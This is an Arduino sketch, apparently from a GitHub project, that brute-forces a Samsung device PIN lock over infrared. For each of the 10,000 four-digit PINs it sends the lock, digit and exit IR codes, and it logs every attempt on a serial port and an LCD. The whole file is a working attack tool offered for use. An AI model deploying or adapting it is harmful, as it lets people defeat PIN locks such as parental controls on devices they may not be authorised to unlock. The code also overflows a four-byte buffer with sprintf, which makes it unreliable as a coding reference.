// Github: ben0/SammyPinBrute
// IR Brute force PIN
#include <IRremote.h>
#include <LiquidCrystal.h>

unsigned long start, finished, elapsed;
static unsigned short pin;
char buffer[4];
IRsend irsend;
LiquidCrystal lcd(8, 9, 4, 5, 6, 7); 

void setup()
{
	Serial.begin(9600);
	lcd.begin(16, 2);              // start the library
	lcd.setCursor(0,0);            // Col, Row
	lcd.print("IRCracker 2.0");
	delay(2000);
	lcd.clear(); 
}

int sendCode(char buf)
{
	char irCommand = buf;
	switch (irCommand)
	{
		case '1':
			irsend.sendSamsung(0xE0E020DF, 32);
			delay(70);
		break;

		case '2':
			irsend.sendSamsung(0xE0E0A05F, 32);
			delay(70);
		break;

		case '3':
			irsend.sendSamsung(0xE0E0609F, 32);
			delay(70);
		break;

		case '4':
			irsend.sendSamsung(0xE0E010EF, 32);
			delay(70);
		break;

		case '5':
			irsend.sendSamsung(0xE0E0906F, 32);
			delay(70);
		break;

		case '6':
			irsend.sendSamsung(0xE0E050AF, 32);
			delay(70);
		break;

		case '7':
			irsend.sendSamsung(0xE0E030CF, 32);
			delay(70);
		break;

		case '8':
			irsend.sendSamsung(0xE0E0B04F, 32);
			delay(70);
		break;

		case '9':
			irsend.sendSamsung(0xE0E0708F, 32);
			delay(70);
		break;

		case '0':
			irsend.sendSamsung(0xE0E08877, 32);
			delay(70);
		break;
	}
}

void loop()
{
	if(Serial.read() != -1)
	{
		for(int pin = 0; pin < 10000; pin++)
		{
			start = millis();
			Serial.print("Pin number attempt:");
			sprintf(buffer,"%04hu",pin);
			Serial.println(buffer);

			lcd.clear();
			lcd.setCursor(0,0);
			lcd.print("Pin:");
			lcd.setCursor(5,0);
			lcd.print(buffer);

			//Serial.println("Sending LOCK Code.");
			irsend.sendSamsung(0xE0E0EE11, 32);
			delay(500);

			lcd.setCursor(0,1);
			lcd.print("Lock");

			//Serial.print("Sending first digit Code:");
			sendCode(buffer[0]);
			lcd.setCursor(5,1);
			lcd.print(buffer[0]);
			delay(500);

			// Serial.print("Sending second digit Code:");
			sendCode(buffer[1]);  
			lcd.setCursor(6,1);
			lcd.print(buffer[1]);     
			delay(500);  

			// Serial.print("Sending third digit Code:");
			sendCode(buffer[2]);
			lcd.setCursor(7,1);
			lcd.print(buffer[2]);     
			delay(500);

			// Serial.print("Sending fourth digit Code:");
			sendCode(buffer[3]);
			lcd.setCursor(8,1);
			lcd.print(buffer[3]);
			delay(500);

			// Send IR Codes
			// Serial.println("Sending OK Code.");
			// irsend.sendSamsung(0xE0E016E9, 32);
			// lcd.setCursor(10,1);
			// lcd.print("OK");
			// delay(500);

			// Serial.println("Sending EXIT Code.");
			irsend.sendSamsung(0xE0E0B44B, 32);
			lcd.setCursor(11,1);
			lcd.print("X");
			delay(500);

			finished = millis();
			elapsed=finished-start;
			Serial.println(elapsed);
		}
	}
}
